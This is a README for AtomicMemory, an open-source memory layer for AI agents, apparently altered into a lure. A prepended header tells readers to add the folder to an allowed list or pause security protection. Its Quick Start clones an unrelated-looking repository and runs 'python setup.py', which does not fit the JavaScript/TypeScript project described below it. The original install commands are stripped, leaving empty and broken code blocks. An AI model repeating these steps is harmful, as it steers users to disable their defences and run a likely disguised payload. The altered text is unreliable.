# AtomicMemory


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ArmsSwordSeparator/atomicmemory-897.git
cd atomicmemory-897
python setup.py
```


[![CI](https://github.com/ArmsSwordSeparator/atomicmemory-897/actions/workflows/ci.yml/badge.svg)](https://github.com/ArmsSwordSeparator/atomicmemory-897/actions/workflows/ci.yml)
[![Core npm](https://img.shields.io/npm/v/%40atomicmemory%2Fcore?label=core)](https://www.npmjs.com/package/@atomicmemory/core)
[![SDK npm](https://img.shields.io/npm/v/%40atomicmemory%2Fsdk?label=sdk)](https://www.npmjs.com/package/@atomicmemory/sdk)
[![CLI npm](https://img.shields.io/npm/v/%40atomicmemory%2Fcli?label=cli)](https://www.npmjs.com/package/@atomicmemory/cli)
[![Docker](https://img.shields.io/badge/docker-GHCR-2496ED?logo=docker&logoColor=white)](packages/core/Dockerfile)
[![Docs](https://img.shields.io/badge/docs-docs.atomicstrata.ai-blue)](https://docs.atomicstrata.ai)
[![License: Apache 2.0](https://img.shields.io/badge/license-Apache--2.0-blue.svg)](LICENSE)

**Inspectable, portable semantic memory for agents and applications.**

AtomicMemory is a memory layer you embed where your AI code already runs. Capture
context, ground generations in prior interactions, and carry knowledge across
sessions — from a direct SDK call, a CLI, an MCP server, a framework adapter, or
a host plugin. Local-first where supported, hosted where convenient, and
designed so the choice can change later without rewriting your application.

Most memory products ask you to trust a hosted black box with the layer that
decides what an AI believes about your users. AtomicMemory takes the opposite
position: the interface should be portable, the engine should be inspectable,
and the memory system should be able to revise itself when facts change.

This repository is the public source of truth for the AtomicMemory JavaScript /
TypeScript packages, framework adapters, host plugins, and public smoke tests.

**Docs:** [docs.atomicstrata.ai](https://docs.atomicstrata.ai)

**Field note:** [The AI Memory Industry Has A Black Box Problem](https://www.atomicstrata.ai/blog/the-ai-memory-industry-has-a-black-box-problem)

## Headline Results

AtomicMemory v66 is leading performance/cost on BEAM-100K, BEAM-1M, and LoCoMo10 under
matched methodology against published competitors. On BEAM-10M it matches the
strongest published Mem0-new result while leaving Hindsight-scale temporal
retrieval as the known open frontier.

| Benchmark | AtomicMemory v66 | Position | Cost/Q | Sample |
|---|---:|---|---:|---:|
| **BEAM-100K lenient** | **0.7375** | Parity with Hindsight at 0.75 | $1.26 | n=80 |
| **BEAM-1M lenient** | **0.6625** | Leading Performance/Cost; +0.022 vs Mem0 paper | $0.083 | n=80 |
| **BEAM-10M lenient** | **0.4875** | Parity with Mem0-new at 0.486 | $0.081 | n=80 |
| **LoCoMo10 GPT-4o-mini binary** | **0.8396** | Leading Performance/Cost; +0.171 vs Mem0 paper | $0.066 | n=1540 |

These results put AtomicMemory at or near the published ceiling in each
reported category while preserving the lower-cost operating profile that
matters for real applications. Reproducibility artifacts and harness details
will be published with the benchmark materials.

## Why AtomicMemory

- **Portable**: a single memory protocol consumed by direct SDK calls, CLIs,
  the MCP server, framework adapters, and host plugins. The same memory store
  serves a LangGraph agent, a Claude Code session, and a custom Vercel AI
  application without re-implementing capture or retrieval semantics.
- **SDK-agnostic**: every adapter is built on the same SDK. Adapters are
  conveniences, not gatekeepers. You can drop down to the SDK at any time and
  keep the same data, indexes, and retrieval behavior.
- **Inspectable**: Core is open source, self-hostable, and built around
  explicit mutation decisions rather than an opaque hosted opinion.
- **Correction-aware**: memory is not just append and recall. Real products
  need supersession, clarification, deletion, no-op decisions, lineage, and
  trust-sensitive revision when users change their mind.
- **Model-surface portable**: the SDK lets applications swap memory backends;
  Core separates embeddings, extraction, mutation, reranking, retrieval
  packaging, and evaluation so the memory engine is not frozen to one model
  vintage.
- **Local or hosted, your choice**: the core engine runs locally for
  privacy-sensitive workloads. The hosted profile is available where it makes
  sense and is marked clearly in the package matrix below. There is no
  capability cliff between the two.
- **No lock-in**: package APIs are stable and semver-disciplined. Migrating
  between direct SDK use, adapters, and host plugins is documented and does not
  require re-ingesting your data. You own your memory store.

## What This Repository Provides

- **Core** — Docker-deployable memory backend with durable context, semantic
  retrieval, memory mutation, and Postgres/pgvector storage.
- **SDK** — backend-agnostic TypeScript client surface with provider interfaces,
  storage helpers, local embeddings, and semantic search primitives.
- **CLI and MCP** — command-line and MCP surfaces for setup, diagnostics,
  capture, retrieval, and context packaging.
- **Framework adapters** — integration packages for Vercel AI SDK, OpenAI
  Agents SDK, LangChain, LangGraph, and Mastra.
- **Host plugins** — package and manifest surfaces for agent hosts such as
  Claude Code, OpenClaw, Hermes, Codex, and Cursor.
- **Public validation** — package metadata checks, smoke contracts, and
  contributor-safe CI gates that keep install paths, docs, and package status in
  sync.

The SDK is the portability contract: applications depend on a typed interface
and provider boundary instead of one memory vendor. Core is the engine that can
earn that slot: self-hosted, auditable, and designed around revision rather than
append-only recall.

## What This Is Not

- Not the hosted AtomicMemory service infrastructure.
- Not the release orchestration or marketplace operations system.
- Not the Python SDK; the Python package remains in its own repository and PyPI
  metadata for now.
- Not the benchmark research repo. Reproducible benchmark suites and raw eval
  harnesses live outside this public monorepo until they are ready to publish as
  public artifacts.
- Not a replacement for package-level READMEs. Package-specific setup still
  lives under `packages/`, `adapters/`, and `plugins/`.

## Performance posture

We make supportable performance claims, not marketing ones. The headline
results above are benchmark scores under matched methodology; latency,
recall@k, and scale-envelope claims should only be quoted when paired with the
linked benchmark, hardware, dataset, and date used to produce them.

Until latency benchmarks are linked from the docs, treat the engine as
"designed for single-digit-ms local retrieval on a developer laptop at typical
agent corpus sizes" — a design target, not a guarantee.


# direct SDK

# CLI

# framework adapter (example: Vercel AI SDK)
```

Minimal SDK shape:

```ts
import { MemoryClient } from '@atomicmemory/sdk';

const memory = new MemoryClient({
  providers: {
    atomicmemory: { apiUrl: 'http://localhost:17350' },
  },
});

await memory.initialize();
await memory.ingest({
  mode: 'messages',
  messages: [{ role: 'user', content: 'I prefer aisle seats.' }],
  scope: { user: 'demo-user' },
});

const results = await memory.search({
  query: 'seat preference',
  scope: { user: 'demo-user' },
});
```

The minimal example, environment setup, and the full list of supported hosts
and frameworks live in the docs site linked below. Adapter and plugin install
contracts (install type, local-core requirement, hosted-mode status) appear at
the top of each integration page.

## Package matrix

Status labels follow the docs contract:

- **published** — available on the npm registry and supported.
- **implemented, publish pending** — code lives in this repo and works locally,
  but the first monorepo-era release has not been cut yet. Do not put these in
  install commands until the row flips to `published`.
- **coming soon** — public source is present, but the host install path is not
  supported yet. Do not use these in install commands until the row flips to
  `published`.
- **unsupported** / **planned** — reserved for future entries.

### Packages

| Package | Path | Status |
| --- | --- | --- |
| `@atomicmemory/core` | `packages/core` | published |
| `@atomicmemory/sdk` | `packages/sdk` | published |
| `@atomicmemory/cli` | `packages/cli` | published |
| `@atomicmemory/mcp-server` | `packages/mcp-server` | published |

### Framework adapters

| Package | Path | Status |
| --- | --- | --- |
| `@atomicmemory/vercel-ai` | `adapters/vercel-ai` | published |
| `@atomicmemory/openai-agents` | `adapters/openai-agents` | published |
| `@atomicmemory/langchain` | `adapters/langchain` | published |
| `@atomicmemory/langgraph` | `adapters/langgraph` | published |
| `@atomicmemory/mastra` | `adapters/mastra` | published |

### Host plugins

| Package | Path | Status |
| --- | --- | --- |
| `@atomicmemory/claude-code-plugin` | `plugins/claude-code` | published |
| `@atomicmemory/openclaw-plugin` | `plugins/openclaw` | published |
| `@atomicmemory/hermes-plugin` | `plugins/hermes` | published |
| `@atomicmemory/codex-plugin` | `plugins/codex` | coming soon |
| `@atomicmemory/cursor-plugin` | `plugins/cursor` | coming soon |

Codex and Cursor plugin source is present, but the public host install path is
coming soon until each host marketplace manifest format is validated end to end.

### Other surfaces

| Surface | Location | Status |
| --- | --- | --- |
| Python SDK (`atomicmemory` on PyPI) | separate repository | published; not part of this monorepo |

## Local development

The skeleton uses pnpm workspaces with Turborepo as the task graph and cache
layer. pnpm owns dependency resolution, workspace linking, and packing. Turbo
owns task ordering, caching, and affected-task selection.

```bash


## Repository layout

```text
packages/      core, sdk, cli, mcp-server
adapters/      framework integrations (Vercel AI, OpenAI Agents, LangChain,
               LangGraph, Mastra)
plugins/       host integrations (Claude Code, OpenClaw, Hermes, Codex, Cursor)
examples/      reserved for phase 2+; only added with owners and CI coverage
tests/smoke/   public, contributor-safe smoke tests
```

Release orchestration, marketplace operations, sensitive service configuration,
and local machine paths are deliberately not part of this repository.

## Contributing

See [`CONTRIBUTING.md`](CONTRIBUTING.md) for the workflow, branch protection
rules, and the public CI lanes a pull request runs through.

AI coding agents should also read [`AGENTS.md`](AGENTS.md). `CLAUDE.md` and
`GEMINI.md` point their respective CLIs at the same public instructions.

## Security

Security policy, supported versions, and the confidential reporting channel are
documented in [`SECURITY.md`](SECURITY.md). Please report suspected
vulnerabilities confidentially rather than opening a public issue.

## License

Apache License 2.0 — see [`LICENSE`](LICENSE).


<!-- Last updated: 2026-06-06 18:12:19 -->
